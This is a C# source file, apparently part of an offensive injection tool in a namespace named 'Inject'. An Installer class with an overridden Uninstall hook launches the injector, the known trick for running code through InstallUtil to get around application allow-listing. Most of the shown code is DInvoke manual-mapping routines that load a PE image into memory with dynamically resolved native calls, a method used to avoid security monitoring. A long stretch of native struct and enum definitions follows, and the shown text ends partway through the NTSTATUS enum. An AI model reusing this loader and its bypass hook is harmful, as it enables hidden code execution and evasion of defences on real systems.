using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;

[Obfuscation(Exclude = false, Feature ="-rename,-constants")]
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Inject.Program.run(new string[]{});
    }
}

namespace Inject
{
    namespace DInvoke.ManualMap {
        public class Map
        {

            /// <summary>
            /// Maps a DLL from disk into a Section using NtCreateSection.
            /// </summary>
            /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLPath">Full path fo the DLL on disk.</param>
            /// <returns>PE.PE_MANUAL_MAP</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleFromDiskToSection(string DLLPath)
            {
                // Check file exists
                if (!File.Exists(DLLPath))
                {
                    throw new InvalidOperationException("Filepath not found.");
                }

                // Open file handle
                Data.Native.UNICODE_STRING ObjectName = new Data.Native.UNICODE_STRING();
                DynamicInvoke.Native.RtlInitUnicodeString(ref ObjectName, (@"\??\" + DLLPath));
                IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
                Marshal.StructureToPtr(ObjectName, pObjectName, true);

                Data.Native.OBJECT_ATTRIBUTES objectAttributes = new Data.Native.OBJECT_ATTRIBUTES();
                objectAttributes.Length = Marshal.SizeOf(objectAttributes);
                objectAttributes.ObjectName = pObjectName;
                objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

                Data.Native.IO_STATUS_BLOCK ioStatusBlock = new Data.Native.IO_STATUS_BLOCK();

                IntPtr hFile = IntPtr.Zero;
                DynamicInvoke.Native.NtOpenFile(
                    ref hFile,
                    Data.Win32.Kernel32.FileAccessFlags.FILE_READ_DATA |
                    Data.Win32.Kernel32.FileAccessFlags.FILE_EXECUTE |
                    Data.Win32.Kernel32.FileAccessFlags.FILE_READ_ATTRIBUTES |
                    Data.Win32.Kernel32.FileAccessFlags.SYNCHRONIZE,
                    ref objectAttributes, ref ioStatusBlock,
                    Data.Win32.Kernel32.FileShareFlags.FILE_SHARE_READ |
                    Data.Win32.Kernel32.FileShareFlags.FILE_SHARE_DELETE,
                    Data.Win32.Kernel32.FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT |
                    Data.Win32.Kernel32.FileOpenFlags.FILE_NON_DIRECTORY_FILE
                );

                // Create section from hFile
                IntPtr hSection = IntPtr.Zero;
                ulong MaxSize = 0;
                Data.Native.NTSTATUS ret = DynamicInvoke.Native.NtCreateSection(
                    ref hSection,
                    (UInt32)Data.Win32.WinNT.ACCESS_MASK.SECTION_ALL_ACCESS,
                    IntPtr.Zero,
                    ref MaxSize,
                    Data.Win32.WinNT.PAGE_READONLY,
                    Data.Win32.WinNT.SEC_IMAGE,
                    hFile
                );

                // Map view of file
                IntPtr pBaseAddress = IntPtr.Zero;
                DynamicInvoke.Native.NtMapViewOfSection(
                    hSection, (IntPtr)(-1), ref pBaseAddress,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                    ref MaxSize, 0x2, 0x0,
                    Data.Win32.WinNT.PAGE_READWRITE
                );

                // Prepare return object
                Data.PE.PE_MANUAL_MAP SecMapObject = new Data.PE.PE_MANUAL_MAP
                {
                    PEINFO = DynamicInvoke.Generic.GetPeMetaData(pBaseAddress),
                    ModuleBase = pBaseAddress
                };

                DynamicInvoke.Win32.CloseHandle(hFile);

                return SecMapObject;
            }

            /// <summary>
            /// Allocate file to memory from disk
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="FilePath">Full path to the file to be alloacted.</param>
            /// <returns>IntPtr base address of the allocated file.</returns>
            public static IntPtr AllocateFileToMemory(string FilePath)
            {
                if (!File.Exists(FilePath))
                {
                    throw new InvalidOperationException("Filepath not found.");
                }

                byte[] bFile = File.ReadAllBytes(FilePath);
                return AllocateBytesToMemory(bFile);
            }

            /// <summary>
            /// Allocate a byte array to memory
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="FileByteArray">Byte array to be allocated.</param>
            /// <returns>IntPtr base address of the allocated file.</returns>
            public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
            {
                IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
                Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
                return pFile;
            }

            /// <summary>
            /// Relocates a module in memory.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <returns>void</returns>
            public static void RelocateModule(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                Data.PE.IMAGE_DATA_DIRECTORY idd = PEINFO.Is32Bit ? PEINFO.OptHeader32.BaseRelocationTable : PEINFO.OptHeader64.BaseRelocationTable;
                Int64 ImageDelta = PEINFO.Is32Bit ? (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader32.ImageBase) :
                                                    (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader64.ImageBase);

                // Ptr for the base reloc table
                IntPtr pRelocTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);
                Int32 nextRelocTableBlock = -1;
                // Loop reloc blocks
                while (nextRelocTableBlock != 0)
                {
                    Data.PE.IMAGE_BASE_RELOCATION ibr = new Data.PE.IMAGE_BASE_RELOCATION();
                    ibr = (Data.PE.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocTable, typeof(Data.PE.IMAGE_BASE_RELOCATION));

                    Int64 RelocCount = ((ibr.SizeOfBlock - Marshal.SizeOf(ibr)) / 2);
                    for (int i = 0; i < RelocCount; i++)
                    {
                        // Calculate reloc entry ptr
                        IntPtr pRelocEntry = (IntPtr)((UInt64)pRelocTable + (UInt64)Marshal.SizeOf(ibr) + (UInt64)(i * 2));
                        UInt16 RelocValue = (UInt16)Marshal.ReadInt16(pRelocEntry);

                        // Parse reloc value
                        // The type should only ever be 0x0, 0x3, 0xA
                        // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                        UInt16 RelocType = (UInt16)(RelocValue >> 12);
                        UInt16 RelocPatch = (UInt16)(RelocValue & 0xfff);

                        // Perform relocation
                        if (RelocType != 0) // IMAGE_REL_BASED_ABSOLUTE (0 -> skip reloc)
                        {
                            try
                            {
                                IntPtr pPatch = (IntPtr)((UInt64)ModuleMemoryBase + ibr.VirtualAdress + RelocPatch);
                                if (RelocType == 0x3) // IMAGE_REL_BASED_HIGHLOW (x86)
                                {
                                    Int32 OriginalPtr = Marshal.ReadInt32(pPatch);
                                    Marshal.WriteInt32(pPatch, (OriginalPtr + (Int32)ImageDelta));
                                }
                                else // IMAGE_REL_BASED_DIR64 (x64)
                                {
                                    Int64 OriginalPtr = Marshal.ReadInt64(pPatch);
                                    Marshal.WriteInt64(pPatch, (OriginalPtr + ImageDelta));
                                }
                            }
                            catch
                            {
                                throw new InvalidOperationException("Memory access violation.");
                            }
                        }
                    }

                    // Check for next block
                    pRelocTable = (IntPtr)((UInt64)pRelocTable + ibr.SizeOfBlock);
                    nextRelocTableBlock = Marshal.ReadInt32(pRelocTable);
                }
            }

            /// <summary>
            /// Rewrite IAT for manually mapped module.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <returns>void</returns>
            public static void RewriteModuleIAT(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                Data.PE.IMAGE_DATA_DIRECTORY idd = PEINFO.Is32Bit ? PEINFO.OptHeader32.ImportTable : PEINFO.OptHeader64.ImportTable;

                // Check if there is no import table
                if (idd.VirtualAddress == 0)
                {
                    // Return so that the rest of the module mapping process may continue.
                    return;
                }

                // Ptr for the base import directory
                IntPtr pImportTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);

                // Get API Set mapping dictionary if on Win10+
                Data.Native.OSVERSIONINFOEX OSVersion = new Data.Native.OSVERSIONINFOEX();
                DynamicInvoke.Native.RtlGetVersion(ref OSVersion);
                Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
                if (OSVersion.MajorVersion >= 10)
                {
                    ApiSetDict = DynamicInvoke.Generic.GetApiSetMapping();
                }

                // Loop IID's
                int counter = 0;
                Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR iid = new Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR();
                iid = (Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(
                    (IntPtr)((UInt64)pImportTable + (uint)(Marshal.SizeOf(iid) * counter)),
                    typeof(Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR)
                );
                while (iid.Name != 0)
                {
                    // Get DLL
                    string DllName = string.Empty;
                    try
                    {
                        DllName = Marshal.PtrToStringAnsi((IntPtr)((UInt64)ModuleMemoryBase + iid.Name));
                    }
                    catch { }

                    // Loop imports
                    if (DllName == string.Empty)
                    {
                        throw new InvalidOperationException("Failed to read DLL name.");
                    }
                    else
                    {
                        string LookupKey = DllName.Substring(0, DllName.Length - 6) + ".dll";
                        // API Set DLL? Ignore the patch number.
                        if (OSVersion.MajorVersion >= 10 && (DllName.StartsWith("api-") || DllName.StartsWith("ext-")) &&
                            ApiSetDict.ContainsKey(LookupKey) && ApiSetDict[LookupKey].Length > 0)
                        {
                            // Not all API set DLL's have a registered host mapping
                            DllName = ApiSetDict[LookupKey];
                        }

                        // Check and / or load DLL
                        IntPtr hModule = DynamicInvoke.Generic.GetLoadedModuleAddress(DllName);
                        if (hModule == IntPtr.Zero)
                        {
                            hModule = DynamicInvoke.Generic.LoadModuleFromDisk(DllName);
                            if (hModule == IntPtr.Zero)
                            {
                                throw new FileNotFoundException(DllName + ", unable to find the specified file.");
                            }
                        }

                        // Loop thunks
                        if (PEINFO.Is32Bit)
                        {
                            Data.PE.IMAGE_THUNK_DATA32 oft_itd = new Data.PE.IMAGE_THUNK_DATA32();
                            for (int i = 0; true; i++)
                            {
                                oft_itd = (Data.PE.IMAGE_THUNK_DATA32)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt32)(i * (sizeof(UInt32)))), typeof(Data.PE.IMAGE_THUNK_DATA32));
                                IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(i * (sizeof(UInt32))));
                                if (oft_itd.AddressOfData == 0)
                                {
                                    break;
                                }

                                if (oft_itd.AddressOfData < 0x80000000) // !IMAGE_ORDINAL_FLAG32
                                {
                                    IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                    IntPtr pFunc = IntPtr.Zero;
                                    pFunc = DynamicInvoke.Generic.GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                    // Write ProcAddress
                                    Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                                }
                                else
                                {
                                    ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                    IntPtr pFunc = IntPtr.Zero;
                                    pFunc = DynamicInvoke.Generic.GetNativeExportAddress(hModule, (short)fOrdinal);

                                    // Write ProcAddress
                                    Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                                }
                            }
                        }
                        else
                        {
                            Data.PE.IMAGE_THUNK_DATA64 oft_itd = new Data.PE.IMAGE_THUNK_DATA64();
                            for (int i = 0; true; i++)
                            {
                                oft_itd = (Data.PE.IMAGE_THUNK_DATA64)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt64)(i * (sizeof(UInt64)))), typeof(Data.PE.IMAGE_THUNK_DATA64));
                                IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(i * (sizeof(UInt64))));
                                if (oft_itd.AddressOfData == 0)
                                {
                                    break;
                                }

                                if (oft_itd.AddressOfData < 0x8000000000000000) // !IMAGE_ORDINAL_FLAG64
                                {
                                    IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                    IntPtr pFunc = IntPtr.Zero;
                                    pFunc = DynamicInvoke.Generic.GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                    // Write pointer
                                    Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                                }
                                else
                                {
                                    ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                    IntPtr pFunc = IntPtr.Zero;
                                    pFunc = DynamicInvoke.Generic.GetNativeExportAddress(hModule, (short)fOrdinal);

                                    // Write pointer
                                    Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                                }
                            }
                        }

                        // Go to the next IID
                        counter++;
                        iid = (Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(
                            (IntPtr)((UInt64)pImportTable + (uint)(Marshal.SizeOf(iid) * counter)),
                            typeof(Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR)
                        );
                    }
                }
            }

            /// <summary>
            /// Set correct module section permissions.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
            /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
            /// <returns>void</returns>
            public static void SetModuleSectionPermissions(Data.PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                // Apply RO to the module header
                IntPtr BaseOfCode = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.BaseOfCode : (IntPtr)PEINFO.OptHeader64.BaseOfCode;
                DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleMemoryBase, ref BaseOfCode, Data.Win32.WinNT.PAGE_READONLY);

                // Apply section permissions
                foreach (Data.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
                {
                    bool isRead = (ish.Characteristics & Data.PE.DataSectionFlags.MEM_READ) != 0;
                    bool isWrite = (ish.Characteristics & Data.PE.DataSectionFlags.MEM_WRITE) != 0;
                    bool isExecute = (ish.Characteristics & Data.PE.DataSectionFlags.MEM_EXECUTE) != 0;
                    uint flNewProtect = 0;
                    if (isRead & !isWrite & !isExecute)
                    {
                        flNewProtect = Data.Win32.WinNT.PAGE_READONLY;
                    }
                    else if (isRead & isWrite & !isExecute)
                    {
                        flNewProtect = Data.Win32.WinNT.PAGE_READWRITE;
                    }
                    else if (isRead & isWrite & isExecute)
                    {
                        flNewProtect = Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                    }
                    else if (isRead & !isWrite & isExecute)
                    {
                        flNewProtect = Data.Win32.WinNT.PAGE_EXECUTE_READ;
                    }
                    else if (!isRead & !isWrite & isExecute)
                    {
                        flNewProtect = Data.Win32.WinNT.PAGE_EXECUTE;
                    }
                    else
                    {
                        throw new InvalidOperationException("Unknown section flag, " + ish.Characteristics);
                    }

                    // Calculate base
                    IntPtr pVirtualSectionBase = (IntPtr)((UInt64)ModuleMemoryBase + ish.VirtualAddress);
                    IntPtr ProtectSize = (IntPtr)ish.VirtualSize;

                    // Set protection
                    DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref pVirtualSectionBase, ref ProtectSize, flNewProtect);
                }
            }

            /// <summary>
            /// Manually map module into current process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="ModulePath">Full path to the module on disk.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(string ModulePath)
            {
                // Alloc module into memory for parsing
                IntPtr pModule = AllocateFileToMemory(ModulePath);
                return MapModuleToMemory(pModule);
            }

            /// <summary>
            /// Manually map module into current process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="Module">Full byte array of the module.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(byte[] Module)
            {
                // Alloc module into memory for parsing
                IntPtr pModule = AllocateBytesToMemory(Module);
                return MapModuleToMemory(pModule);
            }

            /// <summary>
            /// Manually map module into current process starting at the specified base address.
            /// </summary>
            /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
            /// <param name="Module">Full byte array of the module.</param>
            /// <param name="pImage">Address in memory to map module to.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(byte[] Module, IntPtr pImage)
            {
                // Alloc module into memory for parsing
                IntPtr pModule = AllocateBytesToMemory(Module);

                return MapModuleToMemory(pModule, pImage);
            }

            /// <summary>
            /// Manually map module into current process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="pModule">Pointer to the module base.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule)
            {
                // Fetch PE meta data
                Data.PE.PE_META_DATA PEINFO = DynamicInvoke.Generic.GetPeMetaData(pModule);

                // Check module matches the process architecture
                if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
                {
                    Marshal.FreeHGlobal(pModule);
                    throw new InvalidOperationException("The module architecture does not match the process architecture.");
                }

                // Alloc PE image memory -> RW
                IntPtr BaseAddress = IntPtr.Zero;
                IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                IntPtr pImage = DynamicInvoke.Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                    Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                    Data.Win32.WinNT.PAGE_READWRITE
                );
                return MapModuleToMemory(pModule, pImage, PEINFO);
            }

            /// <summary>
            /// Manually map module into current process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="pModule">Pointer to the module base.</param>
            /// <param name="pImage">Pointer to the PEINFO image.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule, IntPtr pImage)
            {
                Data.PE.PE_META_DATA PEINFO = DynamicInvoke.Generic.GetPeMetaData(pModule);
                return MapModuleToMemory(pModule, pImage, PEINFO);
            }

            /// <summary>
            /// Manually map module into current process.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="pModule">Pointer to the module base.</param>
            /// <param name="pImage">Pointer to the PEINFO image.</param>
            /// <param name="PEINFO">PE_META_DATA of the module being mapped.</param>
            /// <returns>PE_MANUAL_MAP object</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule, IntPtr pImage, Data.PE.PE_META_DATA PEINFO)
            {
                // Check module matches the process architecture
                if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
                {
                    Marshal.FreeHGlobal(pModule);
                    throw new InvalidOperationException("The module architecture does not match the process architecture.");
                }

                // Write PE header to memory
                UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
                UInt32 BytesWritten = DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);

                // Write sections to memory
                foreach (Data.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
                {
                    // Calculate offsets
                    IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                    IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

                    // Write data
                    BytesWritten = DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                    if (BytesWritten != ish.SizeOfRawData)
                    {
                        throw new InvalidOperationException("Failed to write to memory.");
                    }
                }

                // Perform relocations
                RelocateModule(PEINFO, pImage);

                // Rewrite IAT
                RewriteModuleIAT(PEINFO, pImage);

                // Set memory protections
                SetModuleSectionPermissions(PEINFO, pImage);

                // Free temp HGlobal
                Marshal.FreeHGlobal(pModule);

                // Prepare return object
                Data.PE.PE_MANUAL_MAP ManMapObject = new Data.PE.PE_MANUAL_MAP
                {
                    ModuleBase = pImage,
                    PEINFO = PEINFO
                };

                return ManMapObject;
            }

            /// <summary>
            /// Free a module that was mapped into the current process.
            /// </summary>
            /// <author>The Wover (@TheRealWover)</author>
            /// <param name="PEMapped">The metadata of the manually mapped module.</param>
            public static void FreeModule(Data.PE.PE_MANUAL_MAP PEMapped)
            {
                // Check if PE was mapped via module overloading
                if (!string.IsNullOrEmpty(PEMapped.DecoyModule))
                {
                    DynamicInvoke.Native.NtUnmapViewOfSection((IntPtr)(-1), PEMapped.ModuleBase);
                }
                // If PE not mapped via module overloading, free the memory.
                else
                {
                    Data.PE.PE_META_DATA PEINFO = PEMapped.PEINFO;

                    // Get the size of the module in memory
                    IntPtr size = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                    IntPtr pModule = PEMapped.ModuleBase;

                    DynamicInvoke.Native.NtFreeVirtualMemory((IntPtr)(-1), ref pModule, ref size, Data.Win32.Kernel32.MEM_RELEASE);
                }
            }
        }
    }
    namespace DInvoke.Data {
        public static class Native
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct UNICODE_STRING
            {
                public UInt16 Length;
                public UInt16 MaximumLength;
                public IntPtr Buffer;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct ANSI_STRING
            {
                public UInt16 Length;
                public UInt16 MaximumLength;
                public IntPtr Buffer;
            }

            public struct PROCESS_BASIC_INFORMATION
            {
                public IntPtr ExitStatus;
                public IntPtr PebBaseAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public UIntPtr UniqueProcessId;
                public int InheritedFromUniqueProcessId;

                public int Size
                {
                    get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
                }
            }

            [StructLayout(LayoutKind.Sequential, Pack = 0)]
            public struct OBJECT_ATTRIBUTES
            {
                public Int32 Length;
                public IntPtr RootDirectory;
                public IntPtr ObjectName; // -> UNICODE_STRING
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IO_STATUS_BLOCK
            {
                public IntPtr Status;
                public IntPtr Information;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct CLIENT_ID
            {
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct OSVERSIONINFOEX
            {
                public uint OSVersionInfoSize;
                public uint MajorVersion;
                public uint MinorVersion;
                public uint BuildNumber;
                public uint PlatformId;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                public string CSDVersion;
                public ushort ServicePackMajor;
                public ushort ServicePackMinor;
                public ushort SuiteMask;
                public byte ProductType;
                public byte Reserved;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LIST_ENTRY
            {
                public IntPtr Flink;
                public IntPtr Blink;
            }

            public enum MEMORYINFOCLASS : int
            {
                MemoryBasicInformation = 0,
                MemoryWorkingSetList,
                MemorySectionName,
                MemoryBasicVlmInformation
            }

            public enum PROCESSINFOCLASS : int
            {
                ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
                ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
                ProcessIoCounters, // q: IO_COUNTERS
                ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX
                ProcessTimes, // q: KERNEL_USER_TIMES
                ProcessBasePriority, // s: KPRIORITY
                ProcessRaisePriority, // s: ULONG
                ProcessDebugPort, // q: HANDLE
                ProcessExceptionPort, // s: HANDLE
                ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
                ProcessLdtInformation, // 10
                ProcessLdtSize,
                ProcessDefaultHardErrorMode, // qs: ULONG
                ProcessIoPortHandlers, // (kernel-mode only)
                ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
                ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
                ProcessUserModeIOPL,
                ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
                ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
                ProcessWx86Information,
                ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
                ProcessAffinityMask, // s: KAFFINITY
                ProcessPriorityBoost, // qs: ULONG
                ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
                ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
                ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
                ProcessWow64Information, // q: ULONG_PTR
                ProcessImageFileName, // q: UNICODE_STRING
                ProcessLUIDDeviceMapsEnabled, // q: ULONG
                ProcessBreakOnTermination, // qs: ULONG
                ProcessDebugObjectHandle, // 30, q: HANDLE
                ProcessDebugFlags, // qs: ULONG
                ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
                ProcessIoPriority, // qs: ULONG
                ProcessExecuteFlags, // qs: ULONG
                ProcessResourceManagement,
                ProcessCookie, // q: ULONG
                ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
                ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION
                ProcessPagePriority, // q: ULONG
                ProcessInstrumentationCallback, // 40
                ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
                ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
                ProcessImageFileNameWin32, // q: UNICODE_STRING
                ProcessImageFileMapping, // q: HANDLE (input)
                ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
                ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
                ProcessGroupInformation, // q: USHORT[]
                ProcessTokenVirtualizationEnabled, // s: ULONG
                ProcessConsoleHostProcess, // q: ULONG_PTR
                ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
                ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
                ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
                ProcessDynamicFunctionTableInformation,
                ProcessHandleCheckingMode,
                ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
                ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
                MaxProcessInfoClass
            };

            /// <summary>
            /// NT_CREATION_FLAGS is an undocumented enum. https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html
            /// </summary>
            public enum NT_CREATION_FLAGS : ulong
            {
                CREATE_SUSPENDED = 0x00000001,
                SKIP_THREAD_ATTACH = 0x00000002,
                HIDE_FROM_DEBUGGER = 0x00000004,
                HAS_SECURITY_DESCRIPTOR = 0x00000010,
                ACCESS_CHECK_IN_TARGET = 0x00000020,
                INITIAL_THREAD = 0x00000080
            }

            /// <summary>
            /// NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
            /// https://www.pinvoke.net/default.aspx/Enums/NtStatus.html
            /// </summary>
            public enum NTSTATUS : uint
            {
                // Success
                Success = 0x00000000,
                Wait0 = 0x00000000,
                Wait1 = 0x00000001,
                Wait2 = 0x00000002,
                Wait3 = 0x00000003,
                Wait63 = 0x0000003f,
                Abandoned = 0x00000080,
                AbandonedWait0 = 0x00000080,
                AbandonedWait1 = 0x00000081,
                AbandonedWait2 = 0x00000082,
                AbandonedWait3 = 0x00000083,
                AbandonedWait63 = 0x000000bf,
                UserApc = 0x000000c0,
                KernelApc = 0x00000100,
                Alerted = 0x00000101,
                Timeout = 0x00000102,
                Pending = 0x00000103,
                Reparse = 0x00000104,
                MoreEntries = 0x00000105,
                NotAllAssigned = 0x00000106,
                SomeNotMapped = 0x00000107,
                OpLockBreakInProgress = 0x00000108,
                VolumeMounted = 0x00000109,
                RxActCommitted = 0x0000010a,
                NotifyCleanup = 0x0000010b,
                NotifyEnumDir = 0x0000010c,
                NoQuotasForAccount = 0x0000010d,
                PrimaryTransportConnectFailed = 0x0000010e,
                PageFaultTransition = 0x00000110,
                PageFaultDemandZero = 0x00000111,
                PageFaultCopyOnWrite = 0x00000112,
                PageFaultGuardPage = 0x00000113,
                PageFaultPagingFile = 0x00000114,
                CrashDump = 0x00000116,
                ReparseObject = 0x00000118,
                NothingToTerminate = 0x00000122,
                ProcessNotInJob = 0x00000123,
                ProcessInJob = 0x00000124,
                ProcessCloned = 0x00000129,
                FileLockedWithOnlyReaders = 0x0000012a,
